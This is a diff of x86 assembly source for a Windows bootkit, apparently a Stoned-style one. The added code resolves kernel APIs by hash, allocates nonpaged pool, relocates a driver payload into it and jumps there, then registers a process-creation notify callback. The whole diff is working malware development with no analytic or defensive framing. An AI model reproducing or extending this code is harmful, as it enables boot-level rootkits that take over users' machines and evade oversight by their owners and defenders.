@@ -595,12 +595,15 @@ jnz Find_Exception_Handler_PE_Image
 call dword Obfuscation_Call
 
 ; standard API hashes (all of ntoskrnl)
-ExAllocatePool    dd    03707E062h  ; ebp-24
-ExFrePool         dd    09D489D1Fh  ; ebp-20
-KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused)
-ZwClose           dd    0DCD44C5Fh  ; ebp-12
-ZwCreateFile      dd    003888F9Dh  ; ebp-8
-ZwReadFile        dd    084FCD516h  ; ebp-4
+; must in the correct order.
+ExAllocatePool    dd    03707E062h  ; ebp-24 203
+ExFreePool         dd    09d489d1fh  ; ebp-20 228
+KeLoaderBlock     dd    03E7DC5A8h  ; ebp-16 (unused) 852
+NtClose           dd    0DCD44C5Fh  ; ebp-12 1879
+NtCreateFile      dd    003888F9Dh  ; ebp-8 1888
+; 842de457
+PsSetCreateProcessNotifyRoutine dd    0842de457h  ; ebp-4 1347
+;NtReadFile        dd    084FCD516h  ; ebp-4 1995
                   dd    000000000h  ; hash zero terminator (no more hash following)
 ; here execution flow goes on..
 Obfuscation_Call:
@@ -608,6 +611,9 @@ Obfuscation_Call:
 lea edx,[ebx+eax]                                                               ; edx = absolute address of PE Header
 mov ecx,[edx+0x50]                                                              ; SizeOfImage
 mov edi,ebx                                                                     ; edi = address of PE image (of DOS header)
+add edi, 0x1000
+and edi,0xFFFFF000   ; page base address
+sub ecx,0x1000
 
 ; scan 74 E3 39 05
 ;_text:004E936E 74 E3                                   jz      short loc_4E9353
@@ -689,11 +695,73 @@ nop
 or al, al
 or al, al
 nop
+; here the loader ends, relocate the driver code; that code could be out sourced to save bootkit memory
+; nt!ExAllocatePool(Type 0, 8192 bytes)
+push dword 8192 ; NumberOfBytes = 8192 bytes
+push dword 0   ; PoolType = 0
+call dword [ebp - 24]     ; ExAllocatePool()
 
-;mov esp,ebp 
+or eax,eax     ; valid buffer?
+jz Exit_Bootkit
+
+mov edi,eax     ; copy the code
+mov esi,[ebp - 32]       ; the pointer to the import terminator
+add esi,Driver_Code - Obfuscation_Call +4    ; use that absolute pointer (+ 4 to seek after the terminator)
+mov ecx,Total_End_of_Binary - Driver_Code
+rep movsb
+
+; initialize the data pointer [ebp-32]
+mov [ebp - 32],eax                                                              ; will point to the data
+add [ebp - 32],dword Data_Reference - Driver_Code                               ; calculate address from absolute point
+
+jmp eax ; jump to execute Driver_Code
+
+Driver_Code:
+nop
+nop
+nop
+; [ebp - 32] = data reference
+
+; store the ntoskrnl base address
+mov esi,[ebp - 32] 
+mov [esi + Ntoskrnl_BaseAddress - Data_Reference],ebx                           ; NT-kernel base address
+
+; allocate a memory pool (1024 bytes) for the Stoned Subsystem
+; nt!ExAllocatePool(Type 0, 1024 bytes)
+push dword 1024                                                                 ; NumberOfBytes = 1024 bytes
+push dword 0                                                                    ; PoolType = 0
+call dword [ebp - 24]                                                           ; ExAllocatePool()
+or eax,eax                                                                      ; valid buffer?
+jz Exit_Bootkit
+mov [esi + Memory_Pool - Data_Reference],eax                                    ; Memory Pool variable
+mov [esi + Callback_NotifyDriverLoad - Data_Reference],dword 0                  ; reset NotifyDriverLoad() callback
+
+mov eax, Data_Reference-MyCreateProcessNotifyRoutine
+sub esi,eax
+push 0
+push esi
+call dword [ebp - 4] 
+jmp Exit_Bootkit
+
+; return from bootkit to Windows
+Exit_Bootkit:
+mov esp,ebp 
 popfd
 popad
 ret
+
+MyCreateProcessNotifyRoutine:
+nop
+nop
+nop
+ret 0ch
+
+; data following, [ebp - 32] will point to here
+Data_Reference:
+Subsystem_Variables:
+Ntoskrnl_BaseAddress        dd  0
+Callback_NotifyDriverLoad   dd  0
+Memory_Pool                 dd  0
 
 Total_End_of_Binary:
 times 4*1024-($-$$) db 0
